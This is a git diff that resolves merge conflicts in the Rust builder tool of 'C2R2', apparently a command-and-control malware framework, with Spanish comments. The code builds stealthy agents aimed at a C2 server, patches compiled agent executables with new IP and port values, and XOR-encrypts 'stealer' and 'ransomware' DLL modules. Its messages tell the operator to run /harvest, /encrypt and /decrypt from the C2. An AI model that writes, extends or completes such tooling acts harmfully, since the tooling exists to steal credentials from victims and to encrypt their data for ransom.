@@ -41,7 +41,6 @@ enum Commands {
         production: bool,
     },
 
-<<<<<<< HEAD
     /// Parchea un agente pre-compilado con nueva IP/Puerto (NO requiere Rust)
     PatchAgent {
         /// Archivo agente.exe de entrada
@@ -57,8 +56,6 @@ enum Commands {
         server: String,
     },
 
-=======
->>>>>>> c91d9a7f4ae0e377b6e588ce3dd50af442df4b6f
     /// Encripta un módulo DLL para ser usado por el agente
     EncryptModule {
         /// Módulo a encriptar (stealer o ransomware)
@@ -122,7 +119,6 @@ fn main() {
     let args = Args::parse();
 
     match args.command {
-<<<<<<< HEAD
         Commands::BuildAgent {
             name,
             server,
@@ -139,13 +135,6 @@ fn main() {
                     "DESARROLLO (debug)"
                 }
             );
-=======
-        Commands::BuildAgent { name, server, production } => {
-            println!(" C2R2 Agent Builder v2.0");
-            println!("  Agente: {}", name);
-            println!(" Servidor C2: {}", server);
-            println!(" Modo: {}", if production { "PRODUCCIÓN (stealthy)" } else { "DESARROLLO (debug)" });
->>>>>>> c91d9a7f4ae0e377b6e588ce3dd50af442df4b6f
             println!("{}", "-".repeat(50));
 
             match generate_agent(&name, &server, production) {
@@ -159,7 +148,6 @@ fn main() {
             }
         }
 
-<<<<<<< HEAD
         Commands::PatchAgent {
             input,
             output,
@@ -183,8 +171,6 @@ fn main() {
             }
         }
 
-=======
->>>>>>> c91d9a7f4ae0e377b6e588ce3dd50af442df4b6f
         Commands::EncryptModule { module } => {
             println!(" C2R2 Module Encryptor v2.0");
             println!(" Módulo: {}", module);
@@ -245,11 +231,7 @@ fn main() {
                 std::process::exit(1);
             };
 
-<<<<<<< HEAD
             println!("📂 DLL encontrada: {}", dll_path.display());
-=======
-            println!(" DLL encontrada: {}", dll_path.display());
->>>>>>> c91d9a7f4ae0e377b6e588ce3dd50af442df4b6f
 
             let output_enc = workspace_root.join(format!("c2r2-server/modules/{}.enc", module));
             let output_key = workspace_root.join(format!("c2r2-server/modules/{}.key", module));
@@ -267,11 +249,7 @@ fn main() {
             // Generar clave XOR aleatoria de 32 bytes
             let xor_key = generate_random_key(32);
 
-<<<<<<< HEAD
             println!("\n📦 Encriptando {}.dll...", module);
-=======
-            println!("\n Encriptando {}.dll...", module);
->>>>>>> c91d9a7f4ae0e377b6e588ce3dd50af442df4b6f
             match encrypt_dll(&dll_path, &output_enc, &xor_key) {
                 Ok(_) => println!(" DLL encriptada: {}", output_enc.display()),
                 Err(e) => {
@@ -285,7 +263,6 @@ fn main() {
                 eprintln!(" Error guardando clave: {}", e);
                 std::process::exit(1);
             }
-<<<<<<< HEAD
             println!(
                 "🔑 Clave guardada: {} ({} bytes)",
                 output_key.display(),
@@ -293,18 +270,12 @@ fn main() {
             );
 
             println!("\n📋 Archivos generados:");
-=======
-            println!(" Clave guardada: {} ({} bytes)", output_key.display(), xor_key.len());
-
-            println!("\n Archivos generados:");
->>>>>>> c91d9a7f4ae0e377b6e588ce3dd50af442df4b6f
             println!("   - {}", output_enc.display());
             println!("   - {}", output_key.display());
 
             if module == "stealer" {
                 println!("\nℹ  Ahora puedes usar /harvest en el C2 para ejecutar el stealer");
             } else if module == "ransomware" {
-<<<<<<< HEAD
                 println!(
                     "\nℹ️  Ahora puedes usar /encrypt o /decrypt en el C2 para usar el ransomware"
                 );
@@ -565,9 +536,6 @@ fn main() {
                     eprintln!("❌ Error construyendo sistema multi-stage: {}", e);
                     std::process::exit(1);
                 }
-=======
-                println!("\nℹ  Ahora puedes usar /encrypt o /decrypt en el C2 para usar el ransomware");
->>>>>>> c91d9a7f4ae0e377b6e588ce3dd50af442df4b6f
             }
         }
     }
